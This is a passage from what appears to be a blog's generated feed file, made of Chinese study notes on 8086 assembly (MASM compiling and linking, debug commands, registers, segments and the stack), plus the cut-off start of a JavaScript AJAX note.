title="编译"></a>编译</h2><p>如源程序存放在C:\1.asm，编译器在<code>c:\masm</code>目录下</p></li><li><p>进入DOS模式，进入<code>C:\masm</code>目录，运行<code>masm.exe</code></p></li><li><p>如要编译的文件在<code>C:\masm</code>目录下，是1.asm，输入<code>1</code>即可。</p><p> 如果在 其他目录下，必须输入绝对路劲。</p></li><li><p>出现OBJ后，可直接回车生成1.obj文件，也可以指定绝对路径，如</p><p> <code>c:\windows\1</code></p></li><li><p>NUL.LST（提示输入列表文件名称）</p><p> 这个文件是编译器将源程序编译为目标文件的过程中产生的文件</p><p> 可直接<code>Enter</code>跳过</p></li><li><p>NUL.CRF（提示输入交叉引用文件名称）</p><p> 功能如编译列表文件相同</p><p> 可直接<code>Enter</code>跳过</p></li><li><p>编译完成后，会生成一个<code>.obj</code>的文件，这是编译所得到的结果</p><h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><p>在对源程序进行编译后，我们需要对目标文件进行连接，从而得到可执行文件。</p><p>工具：微软的Overlay Linker3.60连接器</p></li><li><p>进入DOS模式，进入<code>c:\\masm</code>目录，运行link.exe</p></li><li><p>输入要连接的文件名，Enter</p></li><li><p>NUM.MAP（映像文件名称）</p><p> 中间结果，可Enter跳过</p></li><li><p>LIB（库文件名称）</p><p> 库文件中包含要调用的子程序，如果包含子程序，就需要在连接的时候，将库文件和目标文件连接在一起，生成可执行文件。</p><p> 如果没有，Enter跳过即可</p></li><li><p>生成exe文件。</p><h3 id="连接的作用"><a href="#连接的作用" class="headerlink" title="连接的作用"></a>连接的作用</h3></li><li><p>源程序很大时，可以分为多个源程序编译，每个都变成目标文件后，在连接的时候将他们连接到一起生成一个exe。</p></li><li><p>调用子程序时，需要连接到一起，生成一个exe</p></li><li><p>源程序–&gt;(编译)–&gt;目标文件–&gt;(连接)–&gt;可执行文件</p><h2 id="以简化的方式进行编译和连接"><a href="#以简化的方式进行编译和连接" class="headerlink" title="以简化的方式进行编译和连接"></a>以简化的方式进行编译和连接</h2><p>编译、连接的最终目的都是生成可执行文件，中间的中间文件都可以省略。</p></li><li><p>简洁的编译过程</p><p> DOS进入到<code>masm</code>目录，输入如下指令: </p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masm c:\1;            &#x2F;&#x2F;&quot;在当前路径下自动生成.obj的文件,分号不可省略&quot;</span><br></pre></td></tr></table></figure></li><li><p>简洁的连接过程</p><p> DOS进入到<code>masm</code>目录，输入如下指令: </p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">link 1;               &#x2F;&#x2F;&quot;当前路径下生成.EXE的文件,分号不可省略&quot;</span><br></pre></td></tr></table></figure><h3 id="操作系统的外壳"><a href="#操作系统的外壳" class="headerlink" title="操作系统的外壳"></a>操作系统的外壳</h3><p> 就CMD呗！全称command.com</p></li></ol></li></ol><h1 id="汇编程序从写出到执行的过程"><a href="#汇编程序从写出到执行的过程" class="headerlink" title="汇编程序从写出到执行的过程"></a>汇编程序从写出到执行的过程</h1><p>编程（Edit） –&gt;  1.asm  –&gt;   编译（masm）  –&gt;  1.obj  –&gt;  连接  –&gt;  1.exe  –&gt;  加载（command）  –&gt;  内存中的程序  –&gt;  运行（CPU）</p><p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《汇编语言（第3版）》王爽著；</em></strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> x86汇编 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> x86汇编 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>x86汇编学习笔记(0X07)</title>
+      <link href="2020/09/08/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x07/"/>
+      <url>2020/09/08/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x07/</url>
+      
+        <content type="html"><![CDATA[<h1 id="寄存器（内存访问）（2）"><a href="#寄存器（内存访问）（2）" class="headerlink" title="寄存器（内存访问）（2）"></a>寄存器（内存访问）（2）</h1><h2 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h2><p>栈是一种具有特殊访问方式的存储空间，特性是<strong>后进先出</strong>也叫作<strong>LIFO</strong>(Last In  First Out) </p><h3 id="入栈和出栈"><a href="#入栈和出栈" class="headerlink" title="入栈和出栈"></a>入栈和出栈</h3><blockquote><ul><li>入栈就是将一个新的元素放到栈顶</li><li>出栈就是从栈顶去除一个元素</li></ul></blockquote><h2 id="CPU提供的栈机制"><a href="#CPU提供的栈机制" class="headerlink" title="CPU提供的栈机制"></a>CPU提供的栈机制</h2><p>8086CPU提供相关的指令来以栈的方式访问内存空间，这意味着在编程时，可以将栈当做内存来使用</p><blockquote><h3 id="入栈指令-PUSH-："><a href="#入栈指令-PUSH-：" class="headerlink" title="入栈指令(PUSH)："></a>入栈指令(PUSH)：</h3><blockquote><p><code>push ax</code> //表示将寄存器ax中的数据送入栈中。</p></blockquote><h3 id="出栈指令-POP"><a href="#出栈指令-POP" class="headerlink" title="出栈指令(POP):"></a>出栈指令(POP):</h3><blockquote><p><code>pop ax</code> //表示从栈顶取出数据送入ax。</p></blockquote></blockquote><p>（8086CPU的入栈和出栈的指令都是以<strong>字</strong>为单位进行的）</p><p>在8086CPU中，有两个寄存器，SS和SP，栈顶的段地址存放在SS中，偏移地址存放在SP中。</p><p><strong>任意时刻，SS:SP指向栈顶元素</strong>。（push和pop执行时，CPU从SS和SP中得到栈顶的地址。）</p><p>例：</p><blockquote><p><code>push ax</code>执行时，由以下两步完成：</p><ol><li><code>SP=SP-2</code>，SS:SP指向当前栈顶前面的单元，以当前栈顶前面的单元为新的栈顶。</li><li>将ax中的内容送入SS:SP指向的内存单元处，SS:SP此时指向新的栈顶。</li></ol></blockquote><blockquote><p><code>pop ax</code>执行时，由以下两部完成</p><ol><li>将SS:SP指向的内存单元处的数据送入ax中。</li><li>SP=SP+2,SS:SP指向当前栈顶下面的单元，以当前栈顶下面的单元为新栈顶。</li></ol></blockquote><h2 id="push、pop指令"><a href="#push、pop指令" class="headerlink" title="push、pop指令"></a>push、pop指令</h2><p>push和pop命令是可以在寄存器和内存中传输数据的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push 寄存器    &quot;将一个寄存器中的数据入栈&quot;</span><br><span class="line">pop 寄存器     &quot;出栈，用一个寄存器接收出栈的数据&quot;</span><br></pre></td></tr></table></figure><p>也可以是如下形式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push 段寄存器  &quot;将一个段寄存器的数据入栈&quot;</span><br><span class="line">pop 段寄存器   &quot;出栈，用一个段寄存器接收出栈的数据&quot;</span><br></pre></td></tr></table></figure><p>在内存单元和内存单元之间传送数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push 内存单元  &quot;将一个内存字单元的字入栈&quot;</span><br><span class="line">pop 内存单元   &quot;出栈，用一个内存字单元接收出栈的数据&quot;</span><br></pre></td></tr></table></figure><blockquote><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov ax,1000H</span><br><span class="line">mov ds,ax</span><br><span class="line">push [0]</span><br><span class="line">pop [2]</span><br></pre></td></tr></table></figure></blockquote><h1 id="栈（总结）"><a href="#栈（总结）" class="headerlink" title="栈（总结）"></a>栈（总结）</h1><blockquote><ol><li>8086CPU提供了栈操作机制，方案如下：<ul><li>在SS,SP中存放栈顶的短地址和偏移地址；</li><li>提供入栈和出栈指令，它们根据SS:SP指示的地址，按照栈的方式访问内存单元。</li></ul></li><li>push指令的执行步骤：（1）SP=SP-2; （2）向SS:SP指向的字单元中送入数据</li><li>pop指令的执行步骤：（1）从SS:SP指向的字单元中读取数据；（2）SP=SP+2</li><li>任意时刻，SS:SP指向栈顶的元素</li><li>8086CPU只记录栈顶，栈空间的大小我们要自己管理</li><li>用栈来暂存以后需要灰度的寄存器的内容时，寄存器出栈的书序要和入栈的顺序相反。</li><li>push、pop实质上是一种内存传送指令，注意他们的灵活应用。</li></ol></blockquote><h2 id="栈段"><a href="#栈段" class="headerlink" title="栈段"></a>栈段</h2><p>对于8086PC机，在编程时，可以根据需要，将一组内存单元定义为一个段。我们可以将长度为N(N&lt;=64KB)的一组地址连续、起始地址为16的倍数的内存单元，当做栈空间来用，从而定义了一个栈段。</p><h1 id="段的综述"><a href="#段的综述" class="headerlink" title="段的综述"></a>段的综述</h1><blockquote><ul><li>我们可以将一段内存定义为一个段，用一个段地址指示段，用偏移地址访问段内的单元。这完全是我们自己的安排</li><li>我们可以用一个段存放数据，将他定义为”数据段“</li><li>我们可以用一个段存放代码，将它定义为“代码段”</li><li>我们可以用一个段当做栈，将它定义为”栈段“</li><li>对于数据段，短地址存放在DS中，有add，mov等访问内存单元的指令时，CPU九江我们定义的数据段中的内容当做数据来访问；</li><li>对于代码段，将它的地址放在CS中，将段中第一条指令的偏移地址放在IP中，这样CPU就将执行我们定义的代码段中的指令</li><li>对于栈段，将它的段地址放在SS中，将栈顶单元的偏移地址放在SP中，这样CPU在 需要进行栈操作的时候，比如执行push、pop指令等，就将我们定义的栈段当做栈空间来用</li></ul></blockquote><p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《汇编语言（第3版）》王爽著；</em></strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> x86汇编 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> x86汇编 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>x86汇编学习笔记(0X06)</title>
+      <link href="2020/09/07/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x06/"/>
+      <url>2020/09/07/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x06/</url>
+      
+        <content type="html"><![CDATA[<h1 id="寄存器（内存访问）"><a href="#寄存器（内存访问）" class="headerlink" title="寄存器（内存访问）"></a>寄存器（内存访问）</h1><h2 id="内存中字的存储"><a href="#内存中字的存储" class="headerlink" title="内存中字的存储"></a>内存中字的存储</h2><p>字单元：即存放一个字型数据（16位）的内存单元，由两个地址连续的内存单元组成.高地址位存放字型数据的高位字节，低存放低位字节</p><p>（如一个字单元是由2，3两个内存单元组成，则这个字单元的其实地址为2，我们可是说这是2地址字单元）</p><h2 id="DS和-address"><a href="#DS和-address" class="headerlink" title="DS和[address]"></a>DS和[address]</h2><p>在8086PC中，测i村地址由段地址和偏移地址组成。8086CPU中有一个DS寄存器，用来存放要访问数据的段地址。</p><p>只有偏移地址是不能定位一个内存单元的，当执行指令时，<strong>CPU自动获取DS的数据作为段地址</strong></p><p>寄存器用寄存器来指明，内存单元用内存单元来指明。</p><h2 id="字的传送"><a href="#字的传送" class="headerlink" title="字的传送"></a>字的传送</h2><blockquote><ul><li>mov bx,1000H      //将1000H内存单元中的数据存入bx中。</li><li>mov ds,bx      //将bx寄存器中的内容存入ds寄存器中。</li><li>mov ax,[0]      //将1000:0处的数据存入ax寄存器中。</li><li>mov [0],cx      //cx中的数据送入1000:0内存单元中。</li></ul></blockquote><h2 id="mov，sub，add指令"><a href="#mov，sub，add指令" class="headerlink" title="mov，sub，add指令"></a>mov，sub，add指令</h2><p>mov可以有以下几种形式</p><blockquote><p>mov 寄存器，数据            比如： mov ax,8</p><p>mov 寄存器，寄存器         比如： mov ax，bx</p><p>mov 寄存器，内存单元      比如：mov ax，[0]</p><p>mov 内存单元，寄存器      比如： mov [0],ax</p><p>mov 段寄存器，寄存器       比如：mov ds,ax</p></blockquote><p>add和sub有以下几种形式</p><blockquote><p>add 寄存器，数据             比如：add ax,8</p><p>add 寄存器，寄存器          比如：add ax，bx</p><p>add 寄存器，内存单元       比如：add ax，[0]</p><p>add 内存单元，寄存器       比如：add [0],ax</p><p>sub 寄存器，数据               比如：sub,ax,9</p><p>sub 寄存器，寄存器           比如：sub ax,bx</p><p>sub 寄存器，内存单元        比如：sub ax,[0]</p><p>sub 内存单元，寄存器        比如：sub [0],ax</p></blockquote><h2 id="数据段"><a href="#数据段" class="headerlink" title="数据段"></a>数据段</h2><p>对于8086PC，在编程时，可以根据需要，将一组内存单元定义为一个段。</p><p>可以将一组长度小于64kb、地址连续，起始地址为16的倍数的内存单元专门当做存储数据的内存空间，从而定义了一个<strong>数据段</strong></p><blockquote><p>在具体操作时，可以将数据段存放在ds中。</p></blockquote><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><ol><li>字在内存中存储式，要用两个地址连续的内存单元来存放，字的低位字节存放在低地址单元中，高位字节存放在高地址单元中。</li><li>用mov指令访问内存单元，可以在mov指令中只给出单元的偏移地址，此时，段地址默认在DS寄存器中</li><li>[address]表示一个偏移地址为address的内存单元。</li><li>在内存和寄存器之间传送字形数据时，高地址单元和高8位寄存器，低地址单元和低8位寄存器相对应。</li><li>mov、add、sub是具有两个操作对象的指令。jmp是具有一个操作对象的指令。</li></ol><p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《汇编语言（第3版）》王爽著；</em></strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> x86汇编 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> x86汇编 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>x86汇编学习笔记(0X05)</title>
+      <link href="2020/09/06/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x05/"/>
+      <url>2020/09/06/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x05/</url>
+      
+        <content type="html"><![CDATA[<h1 id="win2000-汇编指令"><a href="#win2000-汇编指令" class="headerlink" title="win2000 汇编指令"></a>win2000 汇编指令</h1><h2 id="什么是debug"><a href="#什么是debug" class="headerlink" title="什么是debug"></a>什么是debug</h2><blockquote><p>debug是DOS、Windows都提供能实施程序调试工具，使用他可以查看CPU各种寄存器中的内容。</p></blockquote><h3 id="进入汇编模式"><a href="#进入汇编模式" class="headerlink" title="进入汇编模式"></a>进入汇编模式</h3><blockquote><ol><li>win2000下，运行中输入command</li><li>进入command</li><li>输入debug，进入debug模式</li></ol></blockquote><h2 id="常用到的debug功能"><a href="#常用到的debug功能" class="headerlink" title="常用到的debug功能"></a>常用到的debug功能</h2><blockquote><ol><li>用Debug的R命令查看、改变CPU寄存器中的内容   <code>-r ax（选择ax寄存器）   --&gt;  1000（ax寄存器中想要改变的值）</code></li><li>用Debug的D命令查看内存中的内容    <code>-d 段地址：偏移地址</code> //会列出从指定内存单元开始的128个内存单元的内容，若需要定义只看哪些，可以在后边加结束地址</li><li>用Debug的E命令改写内存中的内容     <code>-e 起始地址 数据 数据 数据 ····</code> 可以先使用-d查看，然后使用-e修改</li><li>用Debug的U命令将内存中的机器指令改变成汇编指令     <code>-u 1000:0</code>将从1000:0开始的数据翻译为汇编语言</li><li>用Debug的T命令执行一条机器命令    <code>执行完-r命令后，直接执行-t命令即可执行汇编命令</code></li><li>用Debug的A命令以汇编指令的格式在机器中写入一条机器指令     <code>-a 1000:0</code>即可执行从地址1000:0开始的自定义语句</li></ol></blockquote><p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《汇编语言（第3版）》王爽著；</em></strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> x86汇编 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> x86汇编 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>x86汇编学习笔记(0X04)</title>
+      <link href="2020/09/05/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x04/"/>
+      <url>2020/09/05/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x04/</url>
+      
+        <content type="html"><![CDATA[<h1 id="寄存器（2）"><a href="#寄存器（2）" class="headerlink" title="寄存器（2）"></a>寄存器（2）</h1><h2 id="修改CS、IP的指令"><a href="#修改CS、IP的指令" class="headerlink" title="修改CS、IP的指令"></a>修改CS、IP的指令</h2><blockquote><p>在CPU中，程序员能够用指令读写的只有寄存器，可以通过改变寄存器的内容实现对CPU的控制。</p><p>能够改变CS、IP的内容的指令呗统称为<strong>转移指令</strong>，现在介绍jmp指令</p><p>若想同时修改CS、IP的内容，可以用“ jmp 段地址：偏移地址”的指令完成，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">jmp 2AE3:3 &#x2F;&#x2F;执行后:CS&#x3D;2AE3H , IP&#x3D;0003H ,CPU将从2AE33H处读取数据。</span><br><span class="line">jmp 3:0B16 &#x2F;&#x2F;执行后，CS&#x3D;0003H  , IP&#x3D;0B16H,CPU将从00B46H处读取数据。</span><br></pre></td></tr></table></figure><p>若想仅修改IP的内容，可以用“jmp 某一合法寄存器”的指令。如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">jmp ax   &#x2F;&#x2F;指令执行前： ax&#x3D;1000H,CS&#x3D;2000H,IP&#x3D;0003H</span><br><span class="line">&#x2F;&#x2F;指令执行后： ax&#x3D;1000H,CS&#x3D;2000H,IP&#x3D;1000H</span><br><span class="line">jmp bx   &#x2F;&#x2F;指令执行前： ax&#x3D;0B16H,CS&#x3D;2000H,IP&#x3D;0003H</span><br><span class="line">&#x2F;&#x2F;指令执行后： ax&#x3D;0B16H,CS&#x3D;2000H,IP&#x3D;0B16H</span><br><span class="line">&#x2F;&#x2F;&quot;jmp 某一合法寄存器&quot;指令的功能为：用寄存器中的值修改IP。</span><br><span class="line">&#x2F;&#x2F;jmp ax 在含以上好像：mov IP,ax</span><br></pre></td></tr></table></figure></blockquote><h2 id="代码段"><a href="#代码段" class="headerlink" title="代码段"></a>代码段</h2><blockquote><p>在编程时，可以将一组内存单元定义为一个段。</p><p>若将一长度&lt;=64KB的代码存入地址连续、起始地址为16的倍数的内存单元中，就可以认为这段内存是用来存放代码的，从而定义了一个<strong>代码段</strong></p></blockquote><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><blockquote><ol><li><p>段地址在8086CPU的段寄存器中存放。当8086CPU要访问内存时，由段寄存器提供单元的段地址。8086CPU有四个段寄存器，其中CS用来存放指令的段地址，</p></li><li><p>CS存放指令的段地址，IP存放指令的偏移地址。8086机中，任意时刻，CPU将CS:IP指向的内容当作指令执行。</p></li><li><p>8086CPU的工作过程：</p><p> （1）从CS:IP指向的测i村单元读取指令，读取的指令进入指令缓冲器；</p><p> （2）IP指向下一条指令；</p><p> （3）执行指令（转到步骤（1），重复这个过程）</p></li></ol></blockquote><p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《汇编语言（第3版）》王爽著；</em></strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> x86汇编 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> x86汇编 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>x86汇编学习笔记(0X03)</title>
+      <link href="2020/09/04/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x03/"/>
+      <url>2020/09/04/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_0x03/</url>
+      
+        <content type="html"><![CDATA[<h1 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h1><blockquote><p>一个典型的CPU由运算器、控制器、寄存器组成。这些器件靠<strong>内部总线</strong>相连。之前说的总线相对于CPU来说是外部总线，内部总线实现CPU内部各个器件之间的联系，外部总线实现和主板上其他器件的联系。</p><p>在CPU中：</p><ul><li><p>运算器进行信息处理</p></li><li><p>寄存器进行信息存储</p></li><li><p>控制器控制各个器件进行工作</p></li><li><p><strong>内部总线</strong>连接各种器件，在他们之间进行数据的传送</p><p>  对汇编来说，CPU最主要的部件是寄存器，寄存器是CPU中可以用指令读写的部件。可以通过改变寄存器中的内容来实现对CPU的控制。</p></li></ul></blockquote><h2 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h2><blockquote><p>AX,BX,CX,DX这四个寄存器通常用来存放一般性的数据，被称为通用寄存器。</p><p>8086CPU为了兼容之前版本，将16位寄存器分为两个8位寄存器：</p><ul><li>AX分为AL,AH;</li><li>BX分为BL,BH;</li><li>………</li></ul></blockquote><h2 id="字在寄存器中的存储"><a href="#字在寄存器中的存储" class="headerlink" title="字在寄存器中的存储"></a>字在寄存器中的存储</h2><blockquote><ul><li><strong>字节</strong>：记为Byte，一个字节由8个bit组成，可以存在8位寄存器中。</li><li><strong>字</strong>：记为word，一个字由两个字节组成，这两个字节分贝成为高位字节和低位字节。</li></ul><p>数制转换：</p><table><thead><tr><th></th><th align="center"><strong>二进制</strong></th><th align="center"><strong>十进制</strong></th><th align="center"><strong>十六进制</strong></th></tr></thead><tbody><tr><td><strong>值</strong></td><td align="center">0100111000100000</td><td align="center">20000</td><td align="center">4(0100)、E(1110)、2(0010)、0(0000)   |   4E20</td></tr></tbody></table></blockquote><h2 id="几条汇编指令"><a href="#几条汇编指令" class="headerlink" title="几条汇编指令"></a>几条汇编指令</h2><table><thead><tr><th>汇编指令</th><th>控制CPU完成的操作</th><th>用高级语言的语法描述</th></tr></thead><tbody><tr><td>mov ax,18</td><td>将18送入寄存器ax</td><td>AX=18</td></tr><tr><td>mov ah,78</td><td>将78送入寄存器ah</td><td>AH=78</td></tr><tr><td>add ax,8</td><td>将AX寄存器中的数值加上8</td><td>AX=AX+8</td></tr><tr><td>mov ax,bx</td><td>将BX寄存器的数据送入AX</td><td>AX=BX</td></tr><tr><td>add ax,bx</td><td>将AX和BX的数支相加，结果存在AX中</td><td>AX=AX+BX</td></tr></tbody></table><blockquote><p><em>汇编指令不区分大小写</em></p></blockquote><h3 id="程序段中指令的执行情况之一"><a href="#程序段中指令的执行情况之一" class="headerlink" title="程序段中指令的执行情况之一"></a>程序段中指令的执行情况之一</h3><p>（原AX的值0000H，原BX的值0000H）</p><table><thead><tr><th>程序段中的指令</th><th>指令执行后AX的数据</th><th>指令执行后BX的数据</th></tr></thead><tbody><tr><td>mov ax,4E20H</td><td>4E20H</td><td>0000H</td></tr><tr><td>add ax,1406H</td><td>6226H</td><td>0000H</td></tr><tr><td>mov bx,2000H</td><td>6226H</td><td>2000H</td></tr><tr><td>add ax,bx</td><td>8226H</td><td>2000H</td></tr><tr><td>mov bx,ax</td><td>8226H</td><td>8226H</td></tr><tr><td>add ax,bx</td><td><strong>044CH</strong></td><td>8226H</td></tr></tbody></table><p><em>加粗部分结果本应该位1044CH，但是ax为16位寄存器，只能存放四位16进制数据，所以最高位1被舍弃，结果为044CH</em></p><h3 id="程序段中指令的执行情况之二"><a href="#程序段中指令的执行情况之二" class="headerlink" title="程序段中指令的执行情况之二"></a>程序段中指令的执行情况之二</h3><table><thead><tr><th>程序段中的指令</th><th>指令执行后AX中的数据</th><th>指令执行后BX中的数据</th></tr></thead><tbody><tr><td>mov ax,001AH</td><td>001AH</td><td>0000H</td></tr><tr><td>mov bx,0026H</td><td>001AH</td><td>0026H</td></tr><tr><td>add al,bl</td><td>0040H</td><td>0026H</td></tr><tr><td>add ah,bl</td><td>2640H</td><td>0026H</td></tr><tr><td>add bh,al</td><td>2640H</td><td>4026H</td></tr><tr><td>mov ah,0</td><td>0040H</td><td>4026H</td></tr><tr><td>add al,85H</td><td>00C5H</td><td>4026H</td></tr><tr><td>add al,93H</td><td>00<strong>58</strong>H</td><td>4026H</td></tr></tbody></table><p><em>加粗部分结果本应为158，但是16位寄存器只能存放四位16进制数据，所以1舍弃，(低位不向高位进位）</em></p><h2 id="物理地址"><a href="#物理地址" class="headerlink" title="物理地址"></a>物理地址</h2><blockquote><p>所有内存单元构成的存储空间是一个一维的线性空间，每个内存单元都有唯一的对应的地址，这个唯一的地址就叫做物理地址</p><p>CPU通过地址总线送入存储器的，必须是一个内存单元的物理地址。</p></blockquote><h2 id="16位结构CPU"><a href="#16位结构CPU" class="headerlink" title="16位结构CPU"></a>16位结构CPU</h2><blockquote><p>结构特性：</p><ul><li>运算器一次可以处理最多16位的数据</li><li>寄存器的最大宽度为16位</li><li>寄存器和运算器的通路位16位</li></ul></blockquote><h2 id="8086CPU给出物理地址的方法"><a href="#8086CPU给出物理地址的方法" class="headerlink" title="8086CPU给出物理地址的方法"></a>8086CPU给出物理地址的方法</h2><blockquote><p>8086CPU由20位地址总线，一次可以传输20位地址，达到1M的寻址能力。</p><p>8086又是16位结构，内部一次可传输16位地址</p><p><strong>8086CPU用在内部采用两个16位地址合成的方法来形成一个20位物理地址。</strong></p><p>当8086CPU要读写内存时：</p><ol><li>CPU中的相关部件提供两个16位地址，一个为段地址，另一个为偏移地址。</li><li>段地址和偏移地址通过内部总线送入一个叫地址加法器的部件；</li><li>地址加法器将两个16位地址合为一个20位地址</li><li>地址加法器将20位地址通过内部总线送入输入输出控制电路</li><li>输入输出控制电路将20位地址送入地址总线</li><li>20位物理地址被地址总线传送到存储器</li></ol><p>地址加法器采用： <strong>物理地址 = 段地址x16 + 偏移地址</strong></p></blockquote><h2 id="“段地址x16-偏移地址-物理地址”的本质含义"><a href="#“段地址x16-偏移地址-物理地址”的本质含义" class="headerlink" title="“段地址x16 + 偏移地址 = 物理地址”的本质含义"></a>“段地址x16 + 偏移地址 = 物理地址”的本质含义</h2><blockquote><p>本质含义：CPU在访问内存时，用一个<strong>基础地址</strong>（段地址x16）和相对于基础地址的<strong>偏移地址</strong>相加，给出内存单元的物理地址。</p></blockquote><h2 id="段的概念"><a href="#段的概念" class="headerlink" title="段的概念"></a>段的概念</h2><blockquote><p>内存并没有划分段，段的划分来自于CPU，由于CPU使用：段地址x16 + 偏移地址 = 物理地址的方式给出物理地址，是的我们可以用份端的方式来管理内存。</p><p>在变成时可以根据需要，将若干个连续的内存单元看作一个段，用段地址x16定位段的起始地址（基础地址），用偏移地址定位段中的内存单元。</p></blockquote><h2 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h2><blockquote><p>段地址在8086CPU的段寄存器中存放。8086CPU有四个段寄存器，分别为：CS、 DS、SS、ES.</p><p>当8086CPU要访问内存时，由这四个段寄存器提供内存单元的段地址。</p></blockquote><h2 id="CS和IP"><a href="#CS和IP" class="headerlink" title="CS和IP"></a>CS和IP</h2><blockquote><p>CS和IP是8086CPU中两个最关键的寄存器。CS为代码段寄存器，IP为指令指针寄存器。</p><p>在8086PC机中，设CS内容位M，IP内容位N，CPU将从M*16+N单元开始，读取一条指令并执行。</p><p>另一种描述：任意时刻，CPU将CS:IP指向的内容当作指令执行</p><p>CPU工作流程：</p><ol><li>从CD:IP指向的内存单元读取指令，读取的指令进入缓冲器。</li><li>IP=IP+所读取指令的长度，从而指向下一条指令。</li><li>执行指令，转到步骤 1 ，重复这个过程。</li></ol></blockquote><p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《汇编语言（第3版）》王爽著；</em></strong></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> x86汇编 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> x86汇编 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>JS笔记(0X10)</title>
+      <link href="2020/09/03/JS_0X10/"/>
+      <url>2020/09/03/JS_0X10/</url>
+      
+        <content type="html"><![CDATA[<h1 id="AJAX"><a href="#AJAX" class="headerlink" title="AJAX"></a>AJAX</h1><blockquote><p>作用：当点击一个按钮时HTTP会跳转一个新页面，AJAX可以让请求以JS执行，从而不跳转页面。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">success</span>(<span class="params">text</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> textarea = <span class="built_in">document</span>.getElementById(<span 